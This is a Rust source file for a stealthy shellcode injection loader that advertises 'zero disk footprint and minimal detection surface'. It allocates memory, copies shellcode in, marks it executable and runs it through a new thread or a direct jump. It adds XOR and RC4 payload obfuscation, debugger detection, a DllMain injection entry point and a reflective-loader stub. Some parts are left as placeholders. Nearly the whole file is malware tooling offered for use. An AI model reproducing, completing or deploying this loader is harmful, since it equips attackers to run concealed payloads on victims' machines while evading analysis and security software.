#![no_std]
#![feature(core_intrinsics)]
#![feature(lang_items)]

//! Ghost Compiler - Stealth Injection Loader
//! 
//! A no_std Rust loader for reflective in-memory injection
//! with zero disk footprint and minimal detection surface.

#[cfg(windows)]
extern crate winapi;

use core::panic::PanicInfo;
use core::ptr;
use core::slice;

#[cfg(windows)]
use winapi::um::memoryapi::{VirtualAlloc, VirtualProtect};
#[cfg(windows)]
use winapi::um::winnt::{MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE, PAGE_READWRITE};
#[cfg(windows)]
use winapi::um::processthreadsapi::CreateThread;

/// Panic handler for no_std environment
#[panic_handler]
fn panic(_info: &PanicInfo) -> ! {
    loop {}
}

/// Language item required for no_std
#[lang = "eh_personality"]
extern "C" fn eh_personality() {}

/// Memory allocation structure
#[repr(C)]
struct MemoryRegion {
    base: *mut u8,
    size: usize,
    protection: u32,
}

impl MemoryRegion {
    /// Allocate executable memory region
    #[cfg(windows)]
    unsafe fn allocate(size: usize) -> Result<Self, u32> {
        let base = VirtualAlloc(
            ptr::null_mut(),
            size,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_READWRITE,
        );

        if base.is_null() {
            return Err(1); // Allocation failed
        }

        Ok(MemoryRegion {
            base: base as *mut u8,
            size,
            protection: PAGE_READWRITE,
        })
    }

    /// Make memory region executable
    #[cfg(windows)]
    unsafe fn make_executable(&mut self) -> Result<(), u32> {
        let mut old_protect = 0u32;
        let result = VirtualProtect(
            self.base as *mut _,
            self.size,
            PAGE_EXECUTE_READWRITE,
            &mut old_protect,
        );

        if result == 0 {
            return Err(2); // Protection change failed
        }

        self.protection = PAGE_EXECUTE_READWRITE;
        Ok(())
    }

    /// Copy payload into memory region
    unsafe fn copy_payload(&self, payload: &[u8]) -> Result<(), u32> {
        if payload.len() > self.size {
            return Err(3); // Payload too large
        }

        ptr::copy_nonoverlapping(payload.as_ptr(), self.base, payload.len());
        Ok(())
    }
}

/// Shellcode loader structure
pub struct GhostLoader {
    memory: Option<MemoryRegion>,
    payload_size: usize,
}

impl GhostLoader {
    /// Create a new Ghost loader
    pub const fn new() -> Self {
        GhostLoader {
            memory: None,
            payload_size: 0,
        }
    }

    /// Load and execute shellcode in memory
    #[cfg(windows)]
    pub unsafe fn load_and_execute(&mut self, shellcode: &[u8]) -> Result<(), u32> {
        // Step 1: Allocate memory
        let mut memory = MemoryRegion::allocate(shellcode.len())?;

        // Step 2: Copy shellcode
        memory.copy_payload(shellcode)?;

        // Step 3: Make executable
        memory.make_executable()?;

        // Step 4: Execute
        self.memory = Some(memory);
        self.execute_payload()
    }

    /// Execute the loaded payload
    #[cfg(windows)]
    unsafe fn execute_payload(&self) -> Result<(), u32> {
        if let Some(ref memory) = self.memory {
            let thread_func = core::mem::transmute::<*mut u8, unsafe extern "system" fn(*mut _) -> u32>(
                memory.base
            );

            let thread_handle = CreateThread(
                ptr::null_mut(),
                0,
                Some(thread_func),
                ptr::null_mut(),
                0,
                ptr::null_mut(),
            );

            if thread_handle.is_null() {
                return Err(4); // Thread creation failed
            }

            Ok(())
        } else {
            Err(5) // No payload loaded
        }
    }

    /// Reflective loader - loads itself from memory without disk access
    #[cfg(windows)]
    pub unsafe fn reflective_load(shellcode: &[u8], entry_offset: usize) -> Result<(), u32> {
        // Allocate RWX memory
        let mut memory = MemoryRegion::allocate(shellcode.len())?;
        memory.copy_payload(shellcode)?;
        memory.make_executable()?;

        // Calculate entry point
        let entry_point = memory.base.add(entry_offset);
        let entry_func = core::mem::transmute::<*mut u8, unsafe extern "C" fn()>(entry_point);

        // Jump to entry point
        entry_func();

        Ok(())
    }
}

/// XOR decode shellcode (simple obfuscation)
pub unsafe fn xor_decode(encoded: &mut [u8], key: u8) {
    for byte in encoded.iter_mut() {
        *byte ^= key;
    }
}

/// RC4 stream cipher for payload obfuscation
pub struct RC4 {
    s: [u8; 256],
    i: u8,
    j: u8,
}

impl RC4 {
    /// Initialize RC4 with key
    pub fn new(key: &[u8]) -> Self {
        let mut s = [0u8; 256];
        for (i, byte) in s.iter_mut().enumerate() {
            *byte = i as u8;
        }

        let mut j = 0u8;
        for i in 0..256 {
            j = j.wrapping_add(s[i]).wrapping_add(key[i % key.len()]);
            s.swap(i, j as usize);
        }

        RC4 { s, i: 0, j: 0 }
    }

    /// Decrypt/encrypt data
    pub fn crypt(&mut self, data: &mut [u8]) {
        for byte in data.iter_mut() {
            self.i = self.i.wrapping_add(1);
            self.j = self.j.wrapping_add(self.s[self.i as usize]);
            self.s.swap(self.i as usize, self.j as usize);

            let k = self.s[(self.s[self.i as usize].wrapping_add(self.s[self.j as usize])) as usize];
            *byte ^= k;
        }
    }
}

/// Anti-debugging checks
pub mod anti_debug {
    #[cfg(windows)]
    use winapi::um::debugapi::IsDebuggerPresent;

    /// Check if debugger is present
    #[cfg(windows)]
    pub unsafe fn is_debugger_present() -> bool {
        IsDebuggerPresent() != 0
    }

    /// Timing check for debugger detection
    #[cfg(windows)]
    pub unsafe fn timing_check() -> bool {
        use winapi::um::profileapi::{QueryPerformanceCounter, QueryPerformanceFrequency};
        
        let mut start = 0i64;
        let mut end = 0i64;
        let mut freq = 0i64;

        QueryPerformanceFrequency(&mut freq);
        QueryPerformanceCounter(&mut start);
        
        // Intentional no-op
        core::hint::black_box(0);
        
        QueryPerformanceCounter(&mut end);

        let elapsed = end - start;
        let threshold = freq / 1000; // 1ms threshold

        elapsed > threshold
    }
}

/// Entry point for DLL injection
#[cfg(windows)]
#[no_mangle]
pub unsafe extern "system" fn DllMain(
    _hinst_dll: *mut winapi::shared::minwindef::HINSTANCE__,
    fdw_reason: u32,
    _lpv_reserved: *mut core::ffi::c_void,
) -> i32 {
    const DLL_PROCESS_ATTACH: u32 = 1;

    if fdw_reason == DLL_PROCESS_ATTACH {
        // Anti-debug check
        if anti_debug::is_debugger_present() {
            return 0;
        }

        // Payload execution logic here
        // In real scenario, embedded shellcode would be decrypted and executed
    }

    1
}

/// Reflective DLL injection stub
#[cfg(windows)]
#[no_mangle]
pub unsafe extern "system" fn ReflectiveLoader() -> *mut u8 {
    // This function is called by the injector
    // It should locate itself in memory and relocate
    
    // In a real implementation:
    // 1. Find base address of current module
    // 2. Parse PE headers
    // 3. Relocate if necessary
    // 4. Fix imports
    // 5. Call DllMain
    
    ptr::null_mut()
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_xor_decode() {
        let mut data = [0x41, 0x42, 0x43]; // ABC
        let key = 0xFF;
        
        unsafe {
            xor_decode(&mut data, key);
        }
        
        assert_eq!(data, [0xBE, 0xBD, 0xBC]);
        
        unsafe {
            xor_decode(&mut data, key);
        }
        
        assert_eq!(data, [0x41, 0x42, 0x43]); // Should decode back
    }

    #[test]
    fn test_rc4() {
        let key = b"secret";
        let mut data = b"Hello, World!".to_vec();
        let original = data.clone();

        let mut rc4 = RC4::new(key);
        rc4.crypt(&mut data);
        
        assert_ne!(data, original); // Should be encrypted

        let mut rc4_decrypt = RC4::new(key);
        rc4_decrypt.crypt(&mut data);
        
        assert_eq!(data, original); // Should decrypt back
    }
}
